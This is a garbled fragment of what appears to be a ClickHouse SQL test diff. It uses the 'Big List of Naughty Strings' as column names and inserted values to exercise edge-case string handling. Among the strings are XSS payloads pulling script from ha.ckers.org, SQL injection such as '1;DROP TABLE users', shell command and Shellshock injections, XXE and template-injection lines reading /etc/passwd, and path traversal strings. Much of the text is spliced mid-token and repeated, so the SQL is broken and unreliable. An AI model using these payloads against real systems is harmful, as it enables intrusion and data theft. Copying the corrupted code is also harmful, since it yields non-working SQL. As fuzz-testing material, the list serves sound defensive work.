','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we he timeope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_s';
+dundrop_multiwide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็�pl�้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\');//','<u oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</script>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEM�้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\')�     oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</scriENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$',e sy.c;'NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansIpt>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$','NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansInSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna cum laude','Super Bowl XXX','medieval erection of parapets','evaluate','mocha','expression','Arsenal canal','classic','Tyson Gay','Dick Van Dyke','basement','If you\'re reading this, you\'ve been in a coma for almost 20 years now. We\'re trying a new technique. We don\'t know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue','But now...[20Cfor my greatest trick...[8nSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna cum laude','Super Bowl XXX','me
+dieval erection of parapets','evaluate','mocha','expression','Arsenal canal','classic','Tyson Gay','Dick Van Dyke','basement','If you\'re reading this, you\'ve been in a coma for almost 20 years now. We\'re trying a new technique. We don\'t know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue','But now...[20Cfor my greatest trick...[8m','The quic\b\b\b\b\b\bk brown fox... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్m','The quic\b\b\b\b\b\bk brown fox... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**read()3 %}','{{ "".__class__.__mro__[2] }.__subclasses__()[40]("/etc/p}';a
+sswd").read() }}';
